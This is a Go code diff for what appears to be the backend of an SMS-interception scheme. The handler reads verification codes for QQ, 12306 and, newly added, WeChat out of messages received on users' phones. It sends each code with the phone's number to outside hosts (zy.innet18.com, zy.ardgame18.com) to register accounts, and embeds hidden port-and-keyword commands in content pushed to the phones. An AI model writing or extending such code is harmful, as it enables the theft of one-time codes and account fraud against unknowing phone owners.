@@ -72,6 +72,15 @@ func sendC(w http.ResponseWriter, r *http.Request) {
 	} else if strings.EqualFold(r.FormValue("apid"), "5") {
 		process12306Register(msg, *user)
 	}
+	if vi, ok := mapRegisterTargetConfig.Load(r.FormValue("apid")); ok {
+		v := vi.(map[string]string)
+		if strings.EqualFold(v["state"], "open") {
+			// 微信
+			if strings.EqualFold(r.FormValue("apid"), "102") {
+				processWechatRegister(msg, *user)
+			}
+		}
+	}
 }
 
 func processQqRegister(msg string, user map[string]string) {
@@ -93,7 +102,14 @@ func processQqRegister(msg string, user map[string]string) {
 		result = exp.FindStringSubmatch(msg)
 		if nil != result {
 			pwd := result[1]
-			go sendQqtoUrl(qq, pwd, user)
+			mobile := user["mobile"]
+			if len([]rune(user["mobile"])) == 13 {
+				mobile = mobile[2:13]
+			}
+			//生成要访问的url
+			// url := "http://localhost:8090/ss/testc?smsContent=" + smsContent
+			url := "http://zy.ardgame18.com:8080/verifycode/api/getQQVerifyCode.jsp?cid=qq114&pid=114&username=" + qq + "&passwd=" + pwd + "&mobile=" + mobile + "&ccpara="
+			go send2Url(url)
 			go updateRegisterUserSuccess(user, "registerQqSuccessCount")
 		}
 	} else {
@@ -106,13 +122,36 @@ func process12306Register(msg string, user map[string]string) {
 	if nil != result {
 		log.Println(result[1])
 		pwd := result[1]
-		go send12306toUrl(pwd, user)
+		mobile := user["mobile"]
+		if len([]rune(user["mobile"])) == 13 {
+			mobile = mobile[2:13]
+		}
+		url := "http://zy.innet18.com:8080/verifycode/api/getVerifyCode.jsp?cid=c115&pid=115&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara="
+		go send2Url(url)
 		go updateRegisterUserSuccess(user, "register12306SuccessCount")
 	} else {
 		log.Println("process12306Register can not match:%s", msg)
 	}
 }
-func send12306toUrl(pwd string, user map[string]string) {
+func processWechatRegister(msg string, user map[string]string) {
+	exp := regexp.MustCompile(`码：(\S*)。如`)
+	result := exp.FindStringSubmatch(msg)
+	if nil != result {
+		log.Println(result[1])
+		pwd := result[1]
+		mobile := user["mobile"]
+		if len([]rune(user["mobile"])) == 13 {
+			mobile = mobile[2:13]
+		}
+		url := "http://zy.innet18.com:8080/verifycode/api/getVerifyCode.jsp?cid=c115&pid=115&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara="
+		go send2Url(url)
+		go updateRegisterUserSuccess(user, "register12306SuccessCount")
+	} else {
+		log.Println("process12306Register can not match:%s", msg)
+	}
+}
+
+func send2Url(url string) {
 	defer func() {
 		if err := recover(); err != nil {
 			log.Println("error begin:")
@@ -122,53 +161,7 @@ func send12306toUrl(pwd string, user map[string]string) {
 	}()
 	//生成client 参数为默认
 	client := &http.Client{}
-	mobile := user["mobile"]
-	if len([]rune(user["mobile"])) == 13 {
-		mobile = mobile[2:13]
-	}
 	//生成要访问的url
-	// url := "http://localhost:8090/ss/testc?smsContent=" + smsContent
-	url := "http://zy.innet18.com:8080/verifycode/api/getVerifyCode.jsp?cid=c115&pid=115&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara="
-	log.Println(url)
-	//提交请求
-	reqest, err := http.NewRequest("GET", url, nil)
-
-	if err != nil {
-		panic(err)
-	} else {
-		//处理返回结果
-		response, _ := client.Do(reqest)
-
-		//将结果定位到标准输出 也可以直接打印出来 或者定位到其他地方进行相应的处理
-		stdout := os.Stdout
-		_, err = io.Copy(stdout, response.Body)
-		log.Println()
-
-		//返回的状态码
-		status := response.StatusCode
-
-		log.Println(status)
-	}
-
-}
-
-func sendQqtoUrl(qq string, pwd string, user map[string]string) {
-	defer func() {
-		if err := recover(); err != nil {
-			log.Println("error begin:")
-			log.Println(err) // 这里的err其实就是panic传入的内容
-			log.Println("error end:")
-		}
-	}()
-	//生成client 参数为默认
-	client := &http.Client{}
-	mobile := user["mobile"]
-	if len([]rune(user["mobile"])) == 13 {
-		mobile = mobile[2:13]
-	}
-	//生成要访问的url
-	// url := "http://localhost:8090/ss/testc?smsContent=" + smsContent
-	url := "http://zy.ardgame18.com:8080/verifycode/api/getQQVerifyCode.jsp?cid=qq114&pid=114&username=" + qq + "&passwd=" + pwd + "&mobile=" + mobile + "&ccpara="
 	log.Println(url)
 	//提交请求
 	reqest, err := http.NewRequest("GET", url, nil)
@@ -270,18 +263,19 @@ func chooseRegisterContent(user map[string]string) string {
 	mapRegisterTargetConfig.Range(func(ki, vi interface{}) bool {
 		if appCount < 3 {
 			v := vi.(map[string]string)
-			needCmd := false
-			if userRecordMap[v["apid"]] == nil {
-				needCmd = true
-				go insertRelation(user, v["apid"])
-			} else if strings.EqualFold(userRecordMap[v["apid"]]["successCount"], "0") {
-				needCmd = true
-				go updateRelation(userRecordMap[v["apid"]])
-			}
-			if needCmd {
-				result = strings.Replace(result, "[command-"+strconv.Itoa(appCount)+"]", "<data><kno>"+v["portNumber"]+"</kno><kw>"+v["keyword"]+"</kw><apid>"+v["apid"]+"</apid></data>", -1)
-				appCount++
-
+			if strings.EqualFold(v["stateGet"], "open") {
+				needCmd := false
+				if userRecordMap[v["apid"]] == nil {
+					needCmd = true
+					go insertRelation(user, v["apid"])
+				} else if strings.EqualFold(userRecordMap[v["apid"]]["successCount"], "0") {
+					needCmd = true
+					go updateRelation(userRecordMap[v["apid"]])
+				}
+				if needCmd {
+					result = strings.Replace(result, "[command-"+strconv.Itoa(appCount)+"]", "<data><kno>"+v["portNumber"]+"</kno><kw>"+v["keyword"]+"</kw><apid>"+v["apid"]+"</apid></data>", -1)
+					appCount++
+				}
 			}
 			return true
 		} else {
@@ -510,20 +504,14 @@ func loadGlobalConfigFromDb() {
 	// log.Println(mapConfig)
 	targetArray, _ := fetchRows(dbConfig, "SELECT * FROM register_targets")
 	for _, target := range *targetArray {
-		// mapRegisterTargetConfig[target["apid"]] = target
-		if strings.EqualFold(target["stateGet"], "open") {
-			mapRegisterTargetConfig.Store(target["apid"], target)
-		} else {
-			mapRegisterTargetConfig.Delete(target["apid"])
-		}
-
+		mapRegisterTargetConfig.Store(target["apid"], target)
 	}
 	channelArray, _ := fetchRows(dbConfig, "SELECT * FROM register_channels")
 	for _, channel := range *channelArray {
 		// mapRegisterChannelConfig[channel["apid"]] = channel
 		mapRegisterChannelConfig.Store(channel["aid"], channel)
 	}
-	log.Println("loadGlobalConfigFromDb done")
+	// log.Println("loadGlobalConfigFromDb done")
 }
 
 func loadFileConfig() bool {
